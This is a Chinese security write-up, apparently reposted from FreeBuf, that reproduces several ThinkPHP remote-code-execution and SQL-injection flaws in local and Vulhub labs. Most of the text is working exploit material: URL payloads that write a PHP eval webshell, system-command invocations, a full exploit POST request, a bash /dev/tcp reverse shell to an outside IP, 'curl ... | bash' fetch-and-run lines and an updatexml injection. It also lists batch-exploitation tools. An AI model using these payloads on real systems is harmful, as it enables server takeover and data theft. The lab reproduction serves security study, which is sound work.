前言
==

ThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架，诞生于2006年初，原名FCS，2007年元旦正式更名为 ThinkPHP

它遵循 Apache2开源协议发布，从 Struts结构移植过来并做了改进和完善，同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和MVC模式，融合了 Struts的思想和 TagLib(标签库)、RoR的ORM映射和 ActiveRecord模式。

ThinkPHP可在 Windows和 Linux等操作系统运行，支持 MySql，Sqlite和 PostgreSQL等多种数据库以及PDO扩展，是一款跨平台，跨版本以及简单易用的PHP框架。

同时ThinkPHP是一个免费开源用户数量非常多的一个PHP开发框架

本地安装
----

官网：<http://www.thinkphp.cn/down.html>

经典的版本就是这四大类

![image-20210516101707716](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fa1f68d23a7809033ac19dce9897f6a9e5ad6c4c.png)

安装vc9\_x86(必装)

![image-20210516102503058](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b54aa0d1a3f834a8fb6cc003705bbe83b3600da4.png)

安装phpstudy-2016

![image-20210516102546033](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f84e090299f0503c0d2f17e1a9a8dff7bff65ebd.png)

把Thinkphp的包搞到WWW目录下

![image-20210516102800809](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f6df171e7efa5e54405d9379c186c54487f9bf97.png)

这里要注意一下

默认的Thinkphp框架下是有`robots.txt`的

![image-20210516102909994](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e0149c1e4e5becaa9f6abe5a3cca2e1951b9f828.png)

存在信息泄露的

写入的shell或者一句话 也是在这个目录下

```php
C:\phpStudy\WWW\a001\public
```

然后存放日志的目录 是这个

```php
C:\phpStudy\WWW\a001\thinkphp\library\think\log
```

![image-20210516103104540](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6256229918e573a577163c4c28303bd7e91a4e17.png)

要对外访问的嘛 所以要配置域名

这里要注意 目录要选到public目录下 这样才能识别到这个目录下的`router.php`

![image-20210516103602494](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a9054057857bc76ddfbd68263ca4323d684eee97.png)

![image-20210516104047481](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1b430e9f800c53e41e61888d742db093c8e397e7.png)

![image-20210516103643043](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-06695f1a0e547fb8cbaac80737b2d6d79f51a22c.png)

这里也可以不用IP

如果你没有用IP的话 就要去改一下hosts文件

然后新增 保存一下

![image-20210516103759492](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-94fbe59efc9512d87a2455dfd2c2687e0ca612bd.png)

然后远程访问一下

![image-20210516103844729](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ad59d40236bcee3b69f5367d7172e89e81cb7a71.png)

本地漏洞复现
------

### Poc1-phpinfo

```php
/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1%20and%20it%27ll%20execute%20the%20phpinfo
```

![image-20210516104439807](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a34a626b2af7a6c1b2955bcf888ab4bc35410bdd.png)

### Poc2-写入一句话

```php
&lt;?php e val($_POST['a']);?&gt;
```

进行URL编码

![image-20210516104729763](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-de82aee1532a79cf4ca36aadea6994eecea503ac.png)

最后的payload

```php
/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%61%27%5d%29%3b%3f%3e
```

执行一下

![image-20210516104921607](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4ab9b51accf51cf32546e9d938a1f375eab7b908.png)

这样子就是执行成功的

去底层看一下 这个`shell.php`是被写到哪个目录下了

![image-20210516105006426](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a14ce23984df48e49d948430f11da3b4e4075a01.png)

是成功写入的

蚁剑连接一下

![image-20210516105219445](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8ffb6c98cd3f11089167ddf6bd342f8ca44e43c6.png)

![image-20210516105231918](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5e65f042249718c8a3461bee2e3be8f476b2d6c0.png)

可以看到是成功的

Vulhub-Thinkphp复现
-----------------

### Thinkphp 2.x 任意代码执行漏洞

#### 漏洞原理

ThinkPHP2.x版本中，使用 `preg_replace`的`/e`模式匹配路由

```php
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']=&quot;\\2&quot;;', implode($depr,
$paths));
```

导致用户的输入参数被插入`双引号`中执行，造成任意代码执行漏洞

**ThinkPHP3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞**

#### 影响版本

ThinkPHP 2.x

#### 漏洞原理详解

由于是`preg_replace`这个函数引起的漏洞，所以先来看看`preg_replace`这个函数

这个函数是个替换函数，而且支持正则，使用方式如下

```php
preg_replace('正则规则','替换字符','目标字符')
```

这个函数的3个参数，结合起来的意思是：

如果目标字符存在符合正则规则的字符，那么就替换为替换字符，如果此时正则规则中使用了`/e`这个修饰符，则存在代码执行漏洞

```php
e --&gt;配合函数preg_replace()使用，可以把匹配来的字符串当作正则表达式执行
/e--&gt;可执行模式，此为PHP专有参数，例如 preg_replace函数。
```

本地测试直接使用下面这行代码测试即可

沙箱地址：<http://sandbox.onlinephpfunctions.com/>

#### 漏洞复现

```php
cd vulhub-master/thinkphp/2-rcesudo docker-compose up -d 
```

![image-20210516112631321](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d5b7045dd998078bd1e15a79a09c68dcf898841c.png)

访问一下

![image-20210516112904397](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-054bdc8bde85b98eda5aa381ee9c9921912beb73.png)

#### 在线沙箱 进行尝试

沙箱地址： <http://sandbox.onlinephpfunctions.com/>

```php
&lt;?php@preg_replace('/test/e','print_r(&quot;a001&quot;);','just test');
```

7.0以下的版本 存在/e 就可以任意代码执行

![image-20210516113527294](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-98b9bdb800c130d7fb940edae9e224b9da7f7452.png)

![image-20210516113608816](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8839d666e48c28c849a04d45d561bd5a6e31dfaf.png)

#### 代码审计-docker底层分析

![image-20210516113821945](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1ae8174815079c47b1e7088aeeaeef6d2be7f929.png)

找寻一下这个函数

```php
find . -name '*.php' | xargs grep -n 'preg_replace'
```

复制出来 搞到本地

![image-20210516113959977](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-00643f63db4248475f7b6961a4cb85934fbdf94c.png)

存在`/e`修饰符的脚本

```php
./ThinkPHP/Mode/Lite/Dispatcher.class.php:115: $res = preg_replace('@(\w+)'.C('URL_PATHINFO_DEPR').'([^,\/]+)@e', '$pathInfo[\'\\1\']=&quot;\\2&quot;;', $_SERVER['PATH_INFO']);./ThinkPHP/Lib/Think/Util/HtmlCache.class.php:57: $rule = preg_replace('/{\$(_\w+)\.(\w+)\|(\w+)}/e',&quot;\\3(\$\\1['\\2'])&quot;,$rule);./ThinkPHP/Lib/Think/Util/HtmlCache.class.php:58: $rule = preg_replace('/{\$(_\w+)\.(\w+)}/e',&quot;\$\\1['\\2']&quot;,$rule);./ThinkPHP/Lib/Think/Util/HtmlCache.class.php:60: $rule = preg_replace('/{(\w+)\|(\w+)}/e',&quot;\\2(\$_GET['\\1'])&quot;,$rule);./ThinkPHP/Lib/Think/Util/HtmlCache.class.php:61: $rule = preg_replace('/{(\w+)}/e',&quot;\$_GET['\\1']&quot;,$rule);./ThinkPHP/Lib/Think/Util/HtmlCache.class.php:68: $rule = preg_replace('/{|(\w+)}/e',&quot;\\1()&quot;,$rule);./ThinkPHP/Lib/Think/Util/Dispatcher.class.php:102: $res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']=&quot;\\2&quot;;', implode($depr,$paths));./ThinkPHP/Lib/Think/Util/Dispatcher.class.php:224: $res = preg_replace('@(\w+)\/([^,\/]+)@e', '$var[\'\\1\']=&quot;\\2&quot;;', implode('/',$paths));./ThinkPHP/Lib/Think/Util/Dispatcher.class.php:239: $res = preg_replace('@(\w+)\/([^,\/]+)@e', '$var[\'\\1\']=&quot;\\2&quot;;', str_replace($matches[0],'',$regx));./ThinkPHP/Common/extend.php:215: $str = preg_replace('#color=&quot;(.*?)&quot;#', 'style=&quot;color: \\1&quot;', $str);./ThinkPHP/Common/functions.php:145: return ucfirst(preg_replace(&quot;/_([a-zA-Z])/e&quot;, &quot;strtoupper('\\1')&quot;, $name));
```

漏洞的关键就是这里了 代码位置就是在这里了

![image-20210516114455185](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9e2aa6f7975952ff996d6aa9ee8a15405b477983.png)

#### 漏洞验证

```php
/index.php?s=/index/index/name/${@phpinfo()}
```

```php
/index.php?s=/index/index/name/$%7B@phpinfo()%7D
```

![image-20210516114716456](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-94a7a83b2fbaeac8706337429d7712138fc753cf.png)

#### Poc

```php
/index.php?s=a/b/c/${@print(e val($_POST[1]))}
```

进行抓包

改成POST的包

![image-20210516115146602](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5edf0edaa71c029c59a62d24fbfba1563e721b83.png)

```php
1=system('id');
```

执行成功

![image-20210516115253775](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7fd0373043fca8c0868918190d56e0756dc72df2.png)

#### 反弹shell

```php
bash -i &gt;&amp; /dev/tcp/192.168.175.130/8888 0&gt;&amp;1
```

![image-20210516211216935](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-de51f284a0f668221a6bc5ab8cc4251e049286ce.png)

![image-20210516211239687](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-91383e150589400378c43b6dc84c290fb2df8c24.png)

nc开启监听

```php
nc -lvvp 8888
```

![image-20210516211322279](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ca3b99206e080496989b3f69b0c39c03ec0f7a97.png)

python开启http服务

```php
python -m SimpleHTTPServer 9999
```

![image-20210516211311881](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d8de0a1a8ce7ec2bbcfbbb49f7dbd324ede6fc2c.png)

进行执行

```php
1=system(&quot;curl 192.168.175.130:9999/shell.sh | bash&quot;);
```

![image-20210516211508627](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-39b24397a98f9a1d85d1a0a169d44421f0cabe91.png)

nc拿到shell

![image-20210516211559258](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c484a7fb813ada040800c2c4dbfad27277673f65.png)

蚁剑连接的话

```php
http://192.168.175.209:8080/index.php?s=a/b/c/${@print(e val($_POST[1]))}
```

![image-20210516211831135](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6be65a575516713912109ff7312626549459637c.png)

![image-20210516211848214](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-035e841c4b844a7d9f3a320923c07879710b72d2.png)

### Thinkphp5-5.0.22/5.1.29远程代码执行漏洞

#### 漏洞原理

ThinkPHP是在中国使用极为广泛的PHP开发框架。在其版本5中，由于框架错误地处理了控制器名称，因此如果网站未启用强制路由(默认设置)，则该框架可以执行任何方法，从而导致RCE漏洞。

#### 影响版本：

```php
5.0.22/5.1.29
```

#### 漏洞复现

```php
cd vulhub-master/thinkphp/5-rcesudo docker-compose up -d
```

![image-20210516212604870](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-151525fc80cb9f5cd5b4ee4a7464be6342c5cf4c.png)

成功访问

![image-20210516212632637](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-07d738072c869f42e62a801339f4d73835dabfd9.png)

#### 漏洞验证

```php
/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1%20and%20it%27ll%20execute%20the%20phpinfo
```

![image-20210516212649252](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-66069127c011e760f98e6c0bf0e084434c12f1a9.png)

#### 任意代码执行

```php
/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami
```

![image-20210516212706895](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0f2123cb301d950afc7024d28ea5b5dc14478a67.png)

![image-20210516212729751](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-030469dcfbcd8cb4af4798c9744a509253b7f3b0.png)

#### 写入webshell

```php
&lt;?php e val($_POST['a']);?&gt;URL编码%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%61%27%5d%29%3b%3f%3e
```

![image-20210516212512972](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-42afe6fecf536da539ab950a57ae8564d5ccc48f.png)

最后的payload--&gt;shell.php

```php
/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%61%27%5d%29%3b%3f%3e
```

写入成功

![image-20210516212757138](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-16897bea66ee29b86cc120000c3456cf07c773f6.png)

去docker底层看一下

![image-20210516213253882](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5054d61c0695de115e7f217ecff1996a8536f94d.png)

蚁剑连接

![image-20210516212911974](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e13e862b23960c1e16869674dc564a074af142b7.png)

### Thinkphp5.0.23远程代码执行漏洞

#### 漏洞原理

ThinkPHP是在中国使用极为广泛的PHP开发框架。在其版本5.0（&lt;5.0.24）中，框架在获取请求方法时会错误地对其进行处理，就是在获取 method的方法中没有正确处理方法名，这使攻击者可以调用 Request类的任何方法，攻击者可以调用 Request类任意方法并构造利用链，从而导致远程代码执行漏洞

#### 影响版本

```php
Thinkphp5.0.0~5.0.23
```

#### 影响版本

```php
Thinkphp 5.0.0~ 5.0.23
```

#### 漏洞复现

```php
cd vulhub-master/thinkphp/5.0.23-rcesudo docker-compose up -d 
```

![image-20210517092443132](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ca3928accfce86a3a0316ea8f8c2eaa304079af3.png)

访问一下靶机

![image-20210517092510037](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-81efc5e8e26271c4ff86837697e3ad9c3e67ea10.png)

#### 漏洞验证

进行抓包

进行转换

![image-20210517092901244](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9fbf30ed9a1e61cb083f5ba36c4512f845bed467.png)

![image-20210517092957870](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ecf47cfc7d63c404ddb3dca98c2054e290e7e192.png)

这里给出完整的数据包

```php
POST /index.php?s=captcha HTTP/1.1Host: 192.168.175.209:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0Accept: text/html,application/xhtml+x ml,application/x ml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheContent-Type: application/x-www-form-urlencodedContent-Length: 72_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id
```

#### 反弹shell

把反弹shell 写到shell.sh中

![image-20210517093330723](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4a8e0e0f27d4eb014b41c472e3a71f7087775274.png)

python开启http服务

```php
python -m SimpleHTTPServer 9999
```

nc开启监听

```php
nc -vlp 8888
```

进行执行

```php
curl 192.168.175.130:9999/shell.sh | bash
```

![image-20210517093509746](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ef863161e07f77a67d1e503254ef0ae453a56f8b.png)

成功反弹shell

![image-20210517093530918](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-29f86932061eba33a14eb7c9e8a5b100e44c7787.png)

### Thinkphp敏感信息泄露

#### 漏洞原理

传入的某参数在绑定编译指令的时候又没有安全处理，预编译的时候导致SQL异常报错。然而 thinkphp5默认开启debug模式，在漏洞环境下构造错误旳SQL语法会泄漏数据库账户和密码。

#### 影响版本

```php
ThinkPhP &lt;5.1.23
```

#### 源码分析

```php
&lt;?phpnamespace app\index\controller;use app\index\model\User;class Index{ public function index() { $ids = input('ids/a'); $t = new User(); $result = $t-&gt;where('id', 'in', $ids)-&gt;select();}}
```

由上述代码可知，这里用助手函数input定义了参数ids的类型是数组

```php
protected function parseMhere ($where, $options){ $whereStr = $this -&gt; buildWhere($where, $options); if (! empty($options['soft_delete '])) { list ($field, $condition) = $options['soft_delete']; $binds = $this -&gt; query -&gt;getF ieldsBind($optlons); $whereStr = $whereStr ? '(' .$whereStr . ') AND ' : ' '; $whereStr = $whereStr. $this -&gt; parseWhereIten($field, $condition, ' ', $options, $binds); } return empty($wherestr) ? ' ' : ' WHERE ' . $uhereStr;}
```

接着去找 `where('id'，'in'，$ids)`定义的内容，找到了最核心的方法 buildWhere和 parseWhereltem  
接着找到定义`'in'`的位置

```php
&lt;?php...$bindName = $bindName ?: 'where_' . str_replace(['.', '-'], '_', $field);if (preg_match('/\W/', $bindName)) {//处理带非单词字符的字段名 $bindName = md5($bindName);}...} elseif (in_array($exp, ['NOT IN', 'IN'])) { // IN ັᧃ if ($value instanceof \Closure) { $whereStr .= $key . ' ' . $exp . ' ' . $this-&gt;parseClosure($value); } else { $value = is_array($value) ? $value : explode(',', $value); if (array_key_exists($field, $binds)) { $bind = []; $array = []; foreach ($value as $k =&gt; $v) { if ($this-&gt;query-&gt;isBind($bindName . '_in_' . $k)) { $bindKey = $bindName . '_in_' . uniqid() . '_' . $k; } else { $bindKey = $bindName . '_in_' . $k; } $bind[$bindKey] = [$v, $bindType]; $array[] = ':' . $bindKey; } $this-&gt;query-&gt;bind($bind); $zone = implode(',', $array); } else { $zone = implode(',', $this-&gt;parse value($value, $field)); } $whereStr .= $key . ' ' . $exp . ' (' . (empty($zone) ? &quot;''&quot; : $zone) . ')'; }
```

这段代码当引入了in或者 not in的时候遍历value的key和 value。

而key在绑定编译指令的时候又没有安全处理，所以导致了在预编译的时候SQL异常。

#### 漏洞复现

这边在kali上用P牛的靶场

乌班图那边有点问题

kali安装docker

```php
sudo apt install docker-compose
```

```php
sudo systemctl start docker #启动dockercd /vulhub-master/thinkphp/in-sqlinjectionsudo docker-compose up -d
```

![image-20210517102044583](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7dd552ed0aeeb4b64830ed46945a5d64145ec062.png)

![image-20210517102330781](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9502d0c1402dd1189c6dff3044fad57edb6d4479.png)

进行访问

#### 漏洞验证

```php
/index.php?ids[]=1&amp;ids[]=2
```

![image-20210517104950942](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3afedcd2ad5f4c10e4c6030fffa6077b369f6bfd.png)

#### Poc

```php
/index.php?ids[0,updatex ml(0,concat(0xa,user()),0)]=1
```

![image-20210517105047474](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0ffd17dfd6f867a725b1cd14edfa4717fb9649f5.png)

枚举到数据库的账号和密码

Thinkphp自动化武器
-------------

### Thinkphp综合利用工具

![image-20210517103651341](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7cfc7365f7da4bd695ff870ede9c198386f4b19a.png)

### ThinkPHPBatchPoc群扫

执行看一下

![image-20210517104229137](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5e7d78eab3d71b5f1658af019bf06f4ac9407b54.png)

可以去底层看一下

我们可以手动添加Poc

![image-20210517104321007](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c086afbde944ddd102bc0607e2717e68771692d2.png)

它可以自动补充http头

![image-20210517104345163](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b0a377982aa6a86839d018a95dbde09138e44ff7.png)

执行

```php
-u 单个URL-f 执行文件
```

### TPscan

![image-20210517112239340](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f90816a2dbf759b57353409a5808ad84161803c8.png)

### AttackWebF rameworkTools

项目地址：\[GitHub - Anonymous-ghost/AttackWebF rameworkTools: 本软件首先集成危害性较大前台rce(无需登录,或者登录绕过执行rce)。反序列化(利用链简单)。上传getshell。sql注入等高危漏洞直接就可以拿权限出数据。其次对一些构造复杂exp漏洞进行检测。傻瓜式导入url即可实现批量测试,能一键getshell检测绝不sql注入或者不是只检测。其中thinkphp 集成所有rce Exp Struts2漏洞集成了shack2 和k8 漏洞利用工具所有Exp并对他们的exp进行优化和修复此工具的所集成漏洞全部是基于平时实战中所得到的经验从而写入到工具里。例如:通达oA一键getshell实战测试 struts2一键getshell 等等\](<https://github.com/Anonymous-ghost/AttackWebF> rameworkTools)

需要先安装4.5的.NET F ramework

![image-20210517110049535](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9aba4190858f6f2e97f455056cfbfc5e928661f9.png)

然后要新建两个文本文档

![image-20210517112647614](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1094dc12d4fd2281da45a000a2e6d2da6b8eb0b6.png)

### Thinkphp攻击武器

双击打开就可以了

![image-20210517113137966](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5299649459b36b8fd037f578a5ae7357ec7cbb34.png)

![image-20210517113117606](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-953dda203b0c0e91f11bf4bfae7ba9c142bd5ae0.png)

文章转载于：<https://www.freebuf.com/articles/web/281149.html>